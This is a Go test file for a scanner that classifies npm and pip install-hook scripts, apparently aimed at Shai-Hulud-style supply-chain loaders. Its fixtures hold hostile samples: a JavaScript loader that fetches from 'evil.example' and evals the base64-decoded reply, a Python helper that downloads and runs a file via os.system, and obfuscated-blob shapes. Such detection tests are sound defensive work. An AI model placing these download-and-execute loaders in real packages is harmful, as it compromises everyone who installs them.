package installscripts

import (
	"fmt"
	"strings"
	"testing"
)

// TestReferencedScripts_NpmShapes covers the local-script invocation forms
// the npm "bun" loader wave uses, plus the legit build-tool forms that must
// NOT be resolved (system bins, package-name CLIs).
func TestReferencedScripts_NpmShapes(t *testing.T) {
	cases := []struct {
		name string
		hook string
		want []string
	}{
		// Shai-Hulud / bun loader: preinstall runs a bundled JS file.
		{"node bare", "node setup_bun.js", []string{"setup_bun.js"}},
		{"node relative", "node ./scripts/setup_bun.js", []string{"scripts/setup_bun.js"}},
		{"node dot-dir", "node ./setup_bun.js", []string{"setup_bun.js"}},
		{"python", "python install.py", []string{"install.py"}},
		{"python3", "python3 ./tools/x.py", []string{"tools/x.py"}},
		{"sh script", "sh postinstall.sh", []string{"postinstall.sh"}},
		{"bash script", "bash ./run.sh", []string{"run.sh"}},
		{"ts-node", "ts-node ./loader.ts", []string{"loader.ts"}},
		{"direct exec", "./bootstrap.js", []string{"bootstrap.js"}},
		{"node with args", "node setup_bun.js --silent", []string{"setup_bun.js"}},
		{"chained &&", "node a.js && node b.js", []string{"a.js", "b.js"}},
		// `bun run index.js` — the real Shai-Hulud @antv preinstall shape.
		{"bun run", "bun run index.js", []string{"index.js"}},
		{"deno run", "deno run ./loader.ts", []string{"loader.ts"}},

		// MUST NOT resolve: these reference no bundled local file body.
		{"node-gyp", "node-gyp rebuild", nil},
		{"prebuild", "prebuild-install || node-gyp rebuild", nil},
		{"tsc", "tsc -p tsconfig.json", nil},
		{"husky", "husky install", nil},
		{"npm script", "npm run build", nil},
		{"absolute bin", "/usr/bin/node --version", nil},
		{"bare echo", "echo hello", nil},
		// node with a package-style module (no extension, not a path) — not a
		// bundled file we can resolve; don't emit it.
		{"node -e inline", "node -e \"console.log(1)\"", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ReferencedScripts(tc.hook)
			if !sameStrings(got, tc.want) {
				t.Fatalf("ReferencedScripts(%q) = %v, want %v", tc.hook, got, tc.want)
			}
		})
	}
}

// TestReferencedScripts_PyShapes covers pip setup.py invocation of a local
// helper module.
func TestReferencedScripts_PyShapes(t *testing.T) {
	got := ReferencedScripts("python3 ./_bootstrap.py && echo done")
	if !sameStrings(got, []string{"_bootstrap.py"}) {
		t.Fatalf("got %v", got)
	}
}

// TestScanReferencedBody_FetchDecodeExecFires asserts the body-level
// classifier escalates a bundled loader that fetches a remote blob and
// decode-evals it (download-and-execute coupling) to fetches_remote. This is
// the Shai-Hulud catch.
func TestScanReferencedBody_FetchDecodeExecFires(t *testing.T) {
	body := `
const https = require('https');
https.get('https://evil.example/c2', (res) => {
  let d = '';
  res.on('data', c => d += c);
  res.on('end', () => eval(Buffer.from(d, 'base64').toString()));
});
`
	k := ScanReferencedBody(body)
	if k != KindFetchesRemote {
		t.Fatalf("fetch+decode+eval body should be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_ObfuscatedBlobFires asserts a javascript-obfuscator
// hex-identifier blob (the @antv wave shape) escalates even with no readable
// fetch primitive — obfuscation is dispositive.
func TestScanReferencedBody_ObfuscatedBlobFires(t *testing.T) {
	var b strings.Builder
	b.WriteString("const _0x192368=_0x2a3a;")
	for i := 0; i < 60; i++ {
		fmt.Fprintf(&b, "const _0x%06x=_0x192368(0x%x);", i*7+0x300, i)
	}
	k := ScanReferencedBody(b.String())
	if k != KindFetchesRemote {
		t.Fatalf("obfuscated hex-identifier blob should be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_BinaryInstallerStaysClean is the critical FP guard:
// a legit native-addon installer (esbuild/node-sass/sharp shape) fetches a
// platform binary over https and shells out to a local toolchain, but never
// eval/decodes the fetched bytes. It must NOT escalate to fetches_remote.
func TestScanReferencedBody_BinaryInstallerStaysClean(t *testing.T) {
	body := `
const https = require('https');
const child_process = require('child_process');
function fetch(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve(Buffer.concat(chunks)));
    });
  });
}
async function main() {
  const bin = await fetch('https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz');
  require('fs').writeFileSync('./bin/tool', bin);
  child_process.execFileSync('node-gyp', ['rebuild'], { stdio: 'inherit' });
}
main();
`
	k := ScanReferencedBody(body)
	if k == KindFetchesRemote {
		t.Fatalf("benign binary installer (fetch-to-disk + run-binary) must NOT be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_Base64EvalFires covers the obfuscated-loader form:
// a base64 blob decoded and eval'd.
func TestScanReferencedBody_Base64EvalFires(t *testing.T) {
	body := "eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());"
	k := ScanReferencedBody(body)
	if k == KindNone || k == KindPresent {
		t.Fatalf("base64+eval body should escalate, got %q", k)
	}
}

// TestScanReferencedBody_BenignBuildStaysClean is the FP-discipline anchor:
// a real build script that compiles but never fetch-and-execs a remote /
// obfuscated payload must classify as present (or none), never
// fetches_remote.
func TestScanReferencedBody_BenignBuildStaysClean(t *testing.T) {
	// A typical prebuild/gyp wrapper: spawns the local compiler toolchain,
	// no network, no eval, no base64 blob.
	body := `
const { execFileSync } = require('child_process');
execFileSync('node-gyp', ['rebuild'], { stdio: 'inherit' });
console.log('native build complete');
`
	k := ScanReferencedBody(body)
	if k == KindFetchesRemote {
		t.Fatalf("benign local-compile script must not be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_BareAtobConfigStaysClean is the reviewer-confirmed
// CRITICAL FP guard: a benign install script that base64-DECODES an embedded
// config/token (no fetch, no exec of the decoded bytes) must NOT escalate.
// `atob(`/`Buffer.from(...,'base64')` alone is a decode, not a code-exec.
func TestScanReferencedBody_BareAtobConfigStaysClean(t *testing.T) {
	for _, body := range []string{
		`const cfg = JSON.parse(atob(process.env.PKG_DEFAULTS || 'e30='));
console.log('configured', cfg);`,
		`const seed = Buffer.from('aGVsbG8=', 'base64').toString();
require('fs').writeFileSync('./.cache/seed', seed);`,
	} {
		if k := ScanReferencedBody(body); k == KindFetchesRemote {
			t.Fatalf("bare base64-decode of config (no fetch, no exec-of-decode) must NOT be fetches_remote, got %q\nbody: %s", k, body)
		}
	}
}

// TestScanReferencedBody_FetchBinaryWithChecksumStaysClean is the reviewer's
// HIGH coupling FP: a legit installer that fetches a binary, SEPARATELY
// base64-decodes an integrity checksum, and execs the BINARY by path — the
// decode is not the exec argument, so it must NOT escalate.
func TestScanReferencedBody_FetchBinaryWithChecksumStaysClean(t *testing.T) {
	body := `
const https = require('https');
const { execFileSync } = require('child_process');
const crypto = require('crypto');
https.get('https://registry.example.com/pkg/tool-linux-x64', (res) => {
  const chunks = [];
  res.on('data', (c) => chunks.push(c));
  res.on('end', () => {
    const bin = Buffer.concat(chunks);
    const expected = Buffer.from('3q2+7w==', 'base64');               // checksum, decoded separately
    if (!crypto.timingSafeEqual(crypto.createHash('sha256').update(bin).digest(), expected)) process.exit(1);
    require('fs').writeFileSync('./bin/tool', bin, { mode: 0o755 });
    execFileSync('./bin/tool', ['--version'], { stdio: 'inherit' });   // execs the BINARY path, not the decode
  });
});
`
	if k := ScanReferencedBody(body); k == KindFetchesRemote {
		t.Fatalf("legit fetch-binary + separate checksum-decode + exec-binary-by-path must NOT be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_PySubprocessFetchFires covers os.system / subprocess
// + remote download inside a referenced .py helper.
func TestScanReferencedBody_PySubprocessFetchFires(t *testing.T) {
	body := `
import urllib.request, os
urllib.request.urlretrieve('http://evil/x', '/tmp/x')
os.system('/tmp/x')
`
	k := ScanReferencedBody(body)
	if k != KindFetchesRemote {
		t.Fatalf("py download+os.system should be fetches_remote, got %q", k)
	}
}

func TestScanReferencedBody_DependencyMutationWarns(t *testing.T) {
	body := `
import fs from "fs";
import path from "path";

const projectRoot = process.cwd();
const sourcePath = path.join(projectRoot, "vendor", "fetch-page-assets", "index.js");
const targetPath = path.join(projectRoot, "node_modules", "fetch-page-assets", "index.js");
fs.copyFileSync(sourcePath, targetPath);
`
	if k := ScanReferencedBody(body); k != KindMutatesDependency {
		t.Fatalf("node_modules mutation should be mutates_dependency, got %q", k)
	}
}

func TestScanReferencedBody_KnownBuildToolsDoNotWarnAsDependencyMutation(t *testing.T) {
	for _, body := range []string{
		`require('child_process').execFileSync('node-gyp', ['rebuild']);`,
		`require('child_process').execFileSync('patch-package'); // patches node_modules intentionally`,
	} {
		if k := ScanReferencedBody(body); k == KindMutatesDependency || k == KindFetchesRemote {
			t.Fatalf("known build/patch tooling must not be dependency-mutation warning, got %q for %s", k, body)
		}
	}
}

func sameStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
